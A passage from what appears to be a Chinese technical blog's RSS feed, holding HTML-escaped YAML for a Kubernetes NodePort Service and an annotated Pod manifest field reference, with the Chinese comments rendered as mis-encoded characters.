&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;kind&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;Service&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;metadata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;labels&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;app&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;java-web&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;java-web&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;namespace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;ops&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;spec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;ports&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;java-web-port&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;port&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;8889&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;protocol&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;TCP&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;targetPort&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;8889&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;nodePort&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;m&#34;&gt;30009&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;selector&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;app&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;java-web&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;sessionAffinity&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;None&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;NodePort&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;status&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;loadBalancer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;{}&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸Šé¢å¿½ç•¥äº†å¯åŠ¨å‘½ä»¤ï¼Œå…¶å®å®¹å™¨å†…çš„å¯åŠ¨å‘½ä»¤ä¹Ÿæ˜¯å¾ˆæœ‰å­¦é—®çš„ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>kubernetesä¸­Podèµ„æºæ¸…å•å’Œè§£é‡Š</title>
      <link>https://rendoumi.com/posts/20240119-k8s_resource/</link>
      <pubDate>Fri, 19 Jan 2024 12:09:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240119-k8s_resource/</guid>
      <description>&lt;h3 id=&#34;podçš„yamlæ–‡ä»¶çš„èµ„æºæ¸…å•å’Œè§£é‡Šå¤‡æŸ¥&#34;&gt;Podçš„yamlæ–‡ä»¶çš„èµ„æºæ¸…å•å’Œè§£é‡Šï¼Œå¤‡æŸ¥&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;apiVersion&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;v1    &lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#å¿…é€‰ï¼Œç‰ˆæœ¬å·ï¼Œä¾‹å¦‚v1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;kind&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;Pod       ã€€&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#å¿…é€‰ï¼Œèµ„æºç±»å‹ï¼Œä¾‹å¦‚ Pod&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;metadata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;       ã€€ &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#å¿…é€‰ï¼Œå…ƒæ•°æ®&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;string    &lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#å¿…é€‰ï¼ŒPodåç§°&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;namespace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;string &lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#Podæ‰€å±çš„å‘½åç©ºé—´,é»˜è®¤ä¸º&amp;#34;default&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;labels&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;       ã€€ã€€  &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#è‡ªå®šä¹‰æ ‡ç­¾åˆ—è¡¨&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;string      ã€€          &lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;spec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#å¿…é€‰ï¼ŒPodä¸­å®¹å™¨çš„è¯¦ç»†å®šä¹‰&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;containers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#å¿…é€‰ï¼ŒPodä¸­å®¹å™¨åˆ—è¡¨&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;string  &lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#å¿…é€‰ï¼Œå®¹å™¨åç§°&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;image&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;string &lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#å¿…é€‰ï¼Œå®¹å™¨çš„é•œåƒåç§°&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;imagePullPolicy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;Always|Never|IfNotPresent ] &lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#è·å–é•œåƒçš„ç­–ç•¥ &lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;l&#34;&gt;string]  &lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#å®¹å™¨çš„å¯åŠ¨å‘½ä»¤åˆ—è¡¨ï¼Œå¦‚ä¸æŒ‡å®šï¼Œä½¿ç”¨æ‰“åŒ…æ—¶ä½¿ç”¨çš„å¯åŠ¨å‘½ä»¤&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;l&#34;&gt;string]     &lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#å®¹å™¨çš„å¯åŠ¨å‘½ä»¤å‚æ•°åˆ—è¡¨&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;workingDir&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;string &lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#å®¹å™¨çš„å·¥ä½œç›®å½•&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;volumeMounts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;       &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#æŒ‚è½½åˆ°å®¹å™¨å†…éƒ¨çš„å­˜å‚¨å·é…ç½®&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;string     &lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#å¼•ç”¨podå®šä¹‰çš„å…±äº«å­˜å‚¨å·çš„åç§°ï¼Œéœ€ç”¨volumes[]éƒ¨åˆ†å®šä¹‰çš„çš„å·å&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;mountPath&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#å­˜å‚¨å·åœ¨å®¹å™¨å†…mountçš„ç»å¯¹è·¯å¾„ï¼Œåº”å°‘äº512å­—ç¬¦&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;readOnly&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;boolean&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#æ˜¯å¦ä¸ºåªè¯»æ¨¡å¼&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;ports&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#éœ€è¦æš´éœ²çš„ç«¯å£åº“å·åˆ—è¡¨&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;string       &lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#ç«¯å£çš„åç§°&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;containerPort&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;int &lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#å®¹å™¨éœ€è¦ç›‘å¬çš„ç«¯å£å·&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;hostPort&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;int      &lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#å®¹å™¨æ‰€åœ¨ä¸»æœºéœ€è¦ç›‘å¬çš„ç«¯å£å·ï¼Œé»˜è®¤ä¸Containerç›¸åŒ&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;protocol&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;string   &lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#ç«¯å£åè®®ï¼Œæ”¯æŒTCPå’ŒUDPï¼Œé»˜è®¤TCP&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;env&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#å®¹å™¨è¿è¡Œå‰éœ€è®¾ç½®çš„ç¯å¢ƒå˜é‡åˆ—è¡¨&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;- &lt;span class=&#34;nt&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;string &lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#ç¯å¢ƒå˜é‡åç§°&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#ç¯å¢ƒå˜é‡çš„å€¼&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;resources&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#èµ„æºé™åˆ¶å’Œè¯·æ±‚çš„è®¾ç½®&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;limits&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;#èµ„æºé™åˆ¶çš„è®¾ç½®&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
